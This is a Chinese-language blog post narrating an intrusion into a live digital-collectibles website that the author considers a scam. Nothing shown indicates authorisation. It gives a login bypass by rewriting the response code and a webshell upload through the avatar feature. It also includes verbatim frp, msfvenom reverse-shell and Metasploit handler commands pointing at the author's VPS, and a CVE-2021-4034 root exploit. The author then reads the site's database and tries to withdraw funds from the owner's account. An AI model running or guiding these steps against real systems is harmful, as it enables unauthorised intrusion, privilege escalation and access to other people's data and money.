这是一个主打数字藏品的网站元宇宙妥妥的割韭菜，关于这个网站也是无意间找到的。![](../Images/2611e91230145491aaf033d446126ed6.png)

看起来非常假的网站这个网站是没有cdn的用的是thinkphpk框架搭建的。![](../Images/12ab1d3ac4db793f03264c0b6c619ed8.png)

先打一波poc没有效果，

![](../Images/168a782d2f9c9fbb5958c867977ec189.png)

访问一下后台直接在url后面加/admin。

![](../Images/783075ba2e726d2229a1a106d8088f24.png)

一个开源的cms还没有验证码尝试用burp进行爆破，首先在火狐上设置代理ip为127.0.0.1代理端口为8081。![](../Images/acdb660ab1602ed3db70403cee37aa30.png)

Burp上也要设置端口为8081,将Intercept设置为on输入账号密码点击登录就能拦截到数据包。

![](../Images/72749936e26bf74c2a2b30d3e2e19963.png)

![](../Images/c892d22980fe0322ffe06de2ec6d8d65.png)

在爆破之前先发送到Repeater模块发送看看反应。

![](../Images/879a5e822473a882b5cc5a30c341a3e7.png)

用户不存在返回code为1的响应码，尝试拦截返回包把1改为0。![](../Images/fd9cf63877f7648d1c7232b864614530.png)

成功登录后台，这应该是个前端js验证非常的不安全。

![](../Images/8c51b2a6e01a88d30126bf7939de2c56.png)

尝试找上传点，点击用户管理-编辑-上传头像，上传一张jpg文件在用burp抓包改为php将内容改为冰蝎马。

成功上传链接冰蝎马。

![](../Images/fa96159e4c719a8923a8b29a31e76e08.png)

想办法上线到msf提权，这里就使用frp内网穿透，在我的vps开启frp。

./frps -c frps.ini

![](../Images/9265fefe2f4c589bd952c74050cacae7.png)

在内网上的kali进行设置

设置配置文件将8000端口的流量转到kali的6666端口。

启动客户端

./frpc -c frpc.ini

![](../Images/9fdc3dc5c1351e3328ab772bda76ff1c.png)

![](../Images/a1e037915f92a1a5062e055952d5b7e7.png)

生成msf木马ip和端口要填vps的

msfvenom -p linux/x64/meterpreter/reverse\_tcp LHOST=\*\*\*\*  LPORT=8000  -f elf > shell.elf

这里的lhost 应为服务器地址 LPORT 为反向代理端口，将shell.elf上传到/www/wwwroot/目录设置权限为777。

![](../Images/a8f3d58d179b3e7de65f097a25e6ed83.png)

打开msf进行监听

use exploit/multi/handler  
set payload linux/x64/meterpreter/reverse\_tcp  
set lhost 127.0.0.1  
set lport 6666  
exploit

运行shell.elf

./shell.elf

![](../Images/735d02336cb56d943555dc0b5e239fe5.png)

成功返回会话。

![](../Images/66f2fe8ed344b6a227a74f14a2b5b02b.png)

使用模块run post/multi/recon/local\_exploit\_suggester进行漏洞查询。

![](../Images/13990202dc691d72f2650236bc0e0e74.png)

使用cve-2021-4034提权，切换到linux shell下面然后进到/tmp目录下下载脚本。

git clone https://github.com/berdav/CVE-2021-4034.git

![](../Images/9084a391120895def80071b334b7cce9.png)

似乎不行卡住了直接上传上去吧。

upload /home/kali/Desktop/CVE-2021-4034  /tmp/

进入shell

cd /tmp

make

chmod 777 cve-2021-4034

./cve-2021-4034

返回root权限。

![](../Images/cc64cef3c85da65faf0e35268168f7fd.png)

查看database.php文件链接数据库发现基本上也没有人充值，看到一个账号40w的就是这家所谓数字藏品公司的老总。

![](../Images/e74407ae0399d8cea5ce6df32d8ee7ba.png)

登进入尝试体现均提示账户金额异常看来是跑路了，加了它们的官方群进入一看全是讨钱的

在这里提醒一下各位这种所谓的数字藏品都是骗局根本提不出来钱的。
